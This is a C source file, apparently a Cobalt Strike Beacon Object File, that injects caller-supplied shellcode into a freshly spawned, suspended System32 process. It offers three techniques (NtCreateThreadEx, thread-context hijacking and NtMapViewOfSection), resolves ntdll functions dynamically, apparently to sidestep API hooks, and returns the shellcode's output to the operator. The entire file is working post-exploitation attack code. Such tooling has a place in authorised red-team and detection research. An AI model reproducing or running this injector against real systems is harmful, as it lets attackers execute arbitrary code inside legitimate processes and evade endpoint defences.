#include <windows.h>
#include "beacon.h"
#include "addresshunter.h"
#include "functions.h"


#define STATUS_SUCCESS ((NTSTATUS)0x00000000L) // ntsubauth
#define NtGetCurrentProcess() ((HANDLE)(LONG_PTR)-1)

BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
	
	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtCreateThreadEx");
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtAllocateVirtualMemory");
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtWriteVirtualMemory");
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtProtectVirtualMemory");
	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtResumeThread");
	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtWaitForSingleObject");

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if(!KERNEL32$CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to create pipe\n");
		return FALSE;
	}

	if(!KERNEL32$SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to set handle information\n");
		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,"[+] Pipe created successfully\n");

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};

	ZeroMemoryEx(&si, sizeof(si));

	si.cb = sizeof(si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ZeroMemoryEx(&pi, sizeof(pi));

	LPVOID remoteBuffer = NULL;



	char processPath[MAX_PATH];
	MSVCRT$_snprintf(processPath, sizeof(processPath), "C:\\Windows\\System32\\%s", processName);

	if (!KERNEL32$CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to create process\n");
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,"[+] Process created successfully\n");

	// NtAllocateVirutalMemory
	status = NtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to allocate memory in remote process\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Memory allocated successfully\n");

	DWORD oldProtect;
	status = NtProtectVirtualMemory(pi.hProcess, &remoteBuffer, (PULONG) & shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to change memory protection\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Memory protection changed successfully\n");

	status = NtWriteVirtualMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to write shellcode to remote process\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode written successfully\n");
	
	HANDLE hThread = NULL;

	status = NtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		&oa, 
		pi.hProcess,
		(LPTHREAD_START_ROUTINE)remoteBuffer,
		remoteBuffer,
		FALSE,
		NULL,
		NULL,
		NULL,
		NULL
	);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to create remote thread\n");
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Error code: %x\n", status);
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Last Error: %d\n", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Remote thread created successfully\n");

	status = NtResumeThread(hThread, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to resume thread\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);
		KERNEL32$CloseHandle(hThread);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Thread resumed successfully\n");

	if(hThread != NULL) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = INFINITE;

		status = NtWaitForSingleObject(hThread, FALSE, NULL);

		BeaconPrintf(CALLBACK_OUTPUT,"[+] Thread finished successfully\n");
		BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode executed successfully\n");

		KERNEL32$CloseHandle(hWritePipe);

		DWORD dwRead;
		CHAR chBuf[MAX_PATH];
		BOOL bSuccess = FALSE;
		HANDLE hParentStdOut = KERNEL32$GetStdHandle(STD_OUTPUT_HANDLE);
		CHAR *output = (CHAR*)MSVCRT$malloc(1);
		if (output == NULL) {
			BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to allocate memory\n");
			return FALSE;
		}
		output[0] = '\0';

		for (;;) {
			bSuccess = KERNEL32$ReadFile(hReadPipe, chBuf, MAX_PATH - 1, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break;
			chBuf[dwRead] = '\0';
			CHAR *new_output = (CHAR*)MSVCRT$realloc(output, MSVCRT$strlen(output) + dwRead + 2);
			if (new_output == NULL) {
				BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to allocate memory\n");
				MSVCRT$free(output);
				return FALSE;
			}
			output = new_output;
			MSVCRT$strncat(output, chBuf, dwRead);
		}
		output[MSVCRT$strlen(output)] = '\0';
		BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode Output:\n%s\n", output);
		MSVCRT$free(output);
	}

	KERNEL32$CloseHandle(pi.hProcess);
	KERNEL32$CloseHandle(pi.hThread);
	KERNEL32$CloseHandle(hThread);
	KERNEL32$CloseHandle(hReadPipe);
	KERNEL32$CloseHandle(hWritePipe);

	return TRUE;

}


BOOL InjectThreadHijacking(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
	
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtAllocateVirtualMemory");
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtWriteVirtualMemory");
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtProtectVirtualMemory");
	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtResumeThread");
	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtWaitForSingleObject");
	_NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtGetContextThread");
	_NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtSetContextThread");

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if(!KERNEL32$CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to create pipe\n");
		return FALSE;
	}

	if(!KERNEL32$SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to set handle information\n");
		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,"[+] Pipe created successfully\n");

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};

	ZeroMemoryEx(&si, sizeof(si));

	si.cb = sizeof(si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ZeroMemoryEx(&pi, sizeof(pi));

	LPVOID remoteBuffer = NULL;

	char processPath[MAX_PATH];
	MSVCRT$_snprintf(processPath, sizeof(processPath), "C:\\Windows\\System32\\%s", processName);

	if (!KERNEL32$CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to create process\n");
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,"[+] Process created successfully\n");

	// NtAllocateVirutalMemory
	status = NtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to allocate memory in remote process\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Memory allocated successfully\n");

	DWORD oldProtect;
	status = NtProtectVirtualMemory(pi.hProcess, &remoteBuffer, (PULONG) & shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to change memory protection\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Memory protection changed successfully\n");

	status = NtWriteVirtualMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to write shellcode to remote process\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode written successfully\n");

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	status = NtGetContextThread(pi.hThread, &ctx);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to get thread context\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Thread context retrieved successfully\n");
	#if defined(_M_X64) || defined(__amd64__)
        ctx.Rip = (DWORD64)remoteBuffer;
    #elif defined(_M_IX86) || defined(__i386__)
        ctx.Eip = (DWORD)remoteBuffer;
    #endif
	status = NtSetContextThread(pi.hThread, &ctx);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to set thread context\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Thread context set successfully\n");
	status = NtResumeThread(pi.hThread, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to resume thread\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Thread resumed successfully\n");

	if (pi.hThread != NULL) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = INFINITE;

		status = NtWaitForSingleObject(pi.hThread, FALSE, &timeout);
		
		BeaconPrintf(CALLBACK_OUTPUT,"[+] Thread finished successfully\n");
		BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode executed successfully\n");

		KERNEL32$CloseHandle(hWritePipe);

		DWORD dwRead;
		CHAR chBuf[MAX_PATH];
		BOOL bSuccess = FALSE;
		HANDLE hParentStdOut = KERNEL32$GetStdHandle(STD_OUTPUT_HANDLE);
		CHAR *output = (CHAR*)MSVCRT$malloc(1);
		if (output == NULL) {
			BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to allocate memory\n");
			return FALSE;
		}
		output[0] = '\0';

		for (;;) {
			bSuccess = KERNEL32$ReadFile(hReadPipe, chBuf, MAX_PATH - 1, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break;
			chBuf[dwRead] = '\0';
			CHAR *new_output = (CHAR*)MSVCRT$realloc(output, MSVCRT$strlen(output) + dwRead + 2);
			if (new_output == NULL) {
				BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to allocate memory\n");
				MSVCRT$free(output);
				return FALSE;
			}
			output = new_output;
			MSVCRT$strncat(output, chBuf, dwRead);
		}
		output[MSVCRT$strlen(output)] = '\0';
		BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode Output:\n%s\n", output);
		MSVCRT$free(output);
	} 

	KERNEL32$CloseHandle(pi.hProcess);
	KERNEL32$CloseHandle(pi.hThread);
	KERNEL32$CloseHandle(hReadPipe);
	KERNEL32$CloseHandle(hWritePipe);

	return TRUE;

}


BOOL InjectNtMapViewOfSection(CHAR* processName, LPVOID shellcode, SIZE_T shellcodeSize) {
	
	_NtMapViewOfSection NtMapViewOfSection = (_NtMapViewOfSection)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtMapViewOfSection");
	_NtCreateSection NtCreateSection = (_NtCreateSection)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtCreateSection");
	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtUnmapViewOfSection");
	_NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtGetContextThread");
	_NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtSetContextThread");
	_NtResumeThread NtResumeThread = (_NtResumeThread)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtResumeThread");
	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleEx2A("ntdll.dll"), "NtWaitForSingleObject");

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if(!KERNEL32$CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to create pipe\n");
		return FALSE;
	}

	if(!KERNEL32$SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to set handle information\n");
		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,"[+] Pipe created successfully\n");

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};

	ZeroMemoryEx(&si, sizeof(si));

	si.cb = sizeof(si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ZeroMemoryEx(&pi, sizeof(pi));
	char processPath[MAX_PATH];
	
	MSVCRT$_snprintf(processPath, sizeof(processPath), "C:\\Windows\\System32\\%s", processName);
	
	if (!KERNEL32$CreateProcessA(processPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to create process\n");
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,"[+] Process created successfully\n");
	HANDLE hSection = NULL;
	LARGE_INTEGER sectionSize = { shellcodeSize };
	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to create section\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;

	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Section created successfully\n");
	PVOID localBuffer = NULL;
	SIZE_T viewSize = 0;
	status = NtMapViewOfSection(
		hSection,
		NtGetCurrentProcess(),
		&localBuffer,
		0,
		shellcodeSize,
		NULL,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_EXECUTE_READWRITE
	);

	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to map section\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;

	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Section mapped successfully\n");
	CopyMemoryEx(localBuffer, shellcode, shellcodeSize);

	PVOID remoteBuffer = NULL;
	status = NtMapViewOfSection(
		hSection,
		pi.hProcess,
		&remoteBuffer,
		0,
		shellcodeSize,
		NULL,
		&viewSize,
		ViewUnmap,
		0,
		PAGE_EXECUTE_READWRITE
	);

	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to map section\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;

	}
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Section mapped successfully\n");
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	
	NtGetContextThread(pi.hThread, &ctx);
	#if defined(_M_X64) || defined(__amd64__)
        ctx.Rip = (DWORD64)remoteBuffer;
    #elif defined(_M_IX86) || defined(__i386__)
        ctx.Eip = (DWORD)remoteBuffer;
    #endif
	NtSetContextThread(pi.hThread, &ctx);

	status = NtResumeThread(pi.hThread, NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to resume thread\n");
		KERNEL32$CloseHandle(pi.hProcess);
		KERNEL32$CloseHandle(pi.hThread);
		KERNEL32$CloseHandle(hReadPipe);
		KERNEL32$CloseHandle(hWritePipe);

		return FALSE;
	}

	BeaconPrintf(CALLBACK_OUTPUT,"[+] Thread resumed successfully\n");

	if(pi.hThread != NULL) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = INFINITE;

		status = NtWaitForSingleObject(pi.hThread, FALSE, &timeout);

		BeaconPrintf(CALLBACK_OUTPUT,"[+] Thread finished successfully\n");
		BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode executed successfully\n");

		KERNEL32$CloseHandle(hWritePipe);

		DWORD dwRead;
		CHAR chBuf[MAX_PATH];
		BOOL bSuccess = FALSE;
		HANDLE hParentStdOut = KERNEL32$GetStdHandle(STD_OUTPUT_HANDLE);
		CHAR *output = (CHAR*)MSVCRT$malloc(1);
		if (output == NULL) {
			BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to allocate memory\n");
			return FALSE;
		}
		output[0] = '\0';

		for (;;) {
			bSuccess = KERNEL32$ReadFile(hReadPipe, chBuf, MAX_PATH - 1, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break;
			chBuf[dwRead] = '\0';
			CHAR *new_output = (CHAR*)MSVCRT$realloc(output, MSVCRT$strlen(output) + dwRead + 2);
			if (new_output == NULL) {
				BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to allocate memory\n");
				MSVCRT$free(output);
				return FALSE;
			}
			output = new_output;
			MSVCRT$strncat(output, chBuf, dwRead);
		}
		output[MSVCRT$strlen(output)] = '\0';
		BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode Output:\n%s\n", output);
		MSVCRT$free(output);
	
	}

	status = NtUnmapViewOfSection(NtGetCurrentProcess(), localBuffer);

	KERNEL32$CloseHandle(pi.hProcess);
	KERNEL32$CloseHandle(pi.hThread);
	KERNEL32$CloseHandle(hReadPipe);
	KERNEL32$CloseHandle(hWritePipe);
	return TRUE;
	
}

void go(char *args, int len) {
    char* targetProcess;
    char* targetTechnique;
    SIZE_T sc_len;
    char* sc_ptr;

    datap parser;

    BeaconDataParse(&parser, args, len);

    targetTechnique = BeaconDataExtract(&parser, NULL);
    targetProcess = BeaconDataExtract(&parser, NULL);
    sc_len = BeaconDataLength(&parser);
    sc_ptr = BeaconDataExtract(&parser, NULL);

    if (MSVCRT$strcmp(targetTechnique, "NtCreateThreadEx") == 0) {
        if (InjectNtCreateThreadEx(targetProcess, sc_ptr, sc_len)) {
            BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode injected successfully\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to inject shellcode\n");
        }
    } else if (MSVCRT$strcmp(targetTechnique, "ThreadHijacking") == 0) {
        if (InjectThreadHijacking(targetProcess, sc_ptr, sc_len)) {
            BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode injected successfully\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to inject shellcode\n");
        }
    } else if (MSVCRT$strcmp(targetTechnique, "NtMapViewOfSection") == 0) {
        if (InjectNtMapViewOfSection(targetProcess, sc_ptr, sc_len)) {
            BeaconPrintf(CALLBACK_OUTPUT,"[+] Shellcode injected successfully\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,"[-] Failed to inject shellcode\n");
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,"[-] Invalid technique\n");
    }
}